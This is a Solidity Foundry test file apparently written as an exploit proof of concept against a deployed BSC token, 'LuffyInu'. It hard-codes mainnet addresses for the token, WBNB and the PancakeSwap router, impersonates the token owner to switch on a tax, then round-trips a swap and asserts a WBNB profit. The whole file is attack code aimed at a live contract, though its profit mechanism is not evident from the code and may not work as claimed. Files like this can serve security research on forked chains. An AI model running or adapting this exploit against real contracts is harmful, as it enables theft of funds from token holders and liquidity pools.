pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface ILuffyInu is IERC20 {
    function owner() external view returns (address);
    function setTax(bool enable) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x720f6edD18f5e2F414DBa8fCD81E98724708c39E;
    address attacker = address(this);
    ILuffyInu luffy;
    IERC20 wbnb;
    IUniswapV2Router02 router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        luffy = ILuffyInu(TARGET);
        wbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        // Enable tax
        address owner = luffy.owner();
        vm.startPrank(owner);
        luffy.setTax(true);
        vm.stopPrank();

        // Deal WBNB to attacker
        deal(address(wbnb), attacker, 1000 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).balanceOf(address(this));
        uint256 amountToSwap = 1000 ether;

                // Path: WBNB -> Luffy
                address[] memory path1 = new address[](2);
                path1[0] = address(wbnb);
                path1[1] = address(luffy);

                // 1. Swap WBNB for Luffy to manipulate price
                wbnb.approve(address(router), amountToSwap);
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    amountToSwap,
                    0,
                    path1,
                    attacker,
                    block.timestamp
                );

                uint256 luffyBalance = luffy.balanceOf(attacker);

                // Path: Luffy -> WBNB
                address[] memory path2 = new address[](2);
                path2[0] = address(luffy);
                path2[1] = address(wbnb);

                // 2. Swap Luffy back to WBNB for profit
                luffy.approve(address(router), luffyBalance);
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    luffyBalance,
                    0,
                    path2,
                    attacker,
                    block.timestamp
                );
        uint256 finalBalance = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

